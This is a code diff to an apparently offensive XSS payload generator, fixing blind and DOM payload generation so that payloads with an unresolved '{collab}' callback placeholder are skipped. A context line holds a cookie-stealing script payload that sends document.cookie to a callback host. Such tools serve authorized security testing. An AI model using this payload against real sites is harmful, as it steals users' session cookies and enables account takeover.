@@ -161,7 +161,10 @@ class PayloadEngine:
     def generate_blind(self, max_payloads=0) -> List[str]:
         payloads = []
         for p in BASE_PAYLOADS_BLIND:
-            payloads.append(self._resolve_collab(p))
+            resolved = self._resolve_collab(p)
+            if "{collab}" in resolved:
+                continue
+            payloads.append(resolved)
         if self.collab_url:
             exfil_src = '<script>new Image().src="http://{collab}/xss?c="+document.cookie</script>'
             encoded = base64.b64encode(exfil_src.replace("{collab}", self._collab_hostport()).encode()).decode()
@@ -180,7 +183,12 @@ class PayloadEngine:
     def generate_dom(self, max_payloads=0) -> List[str]:
         payloads = []
         for p in PAYLOADS_DOM:
-            payloads.append(self._resolve_collab(p))
+            resolved = self._resolve_collab(p)
+            # Drop OOB payloads when we have no callback host — otherwise the
+            # literal "{collab}" placeholder leaks into reports.
+            if "{collab}" in resolved:
+                continue
+            payloads.append(resolved)
         if max_payloads > 0:
             random.shuffle(payloads)
             return payloads[:max_payloads]
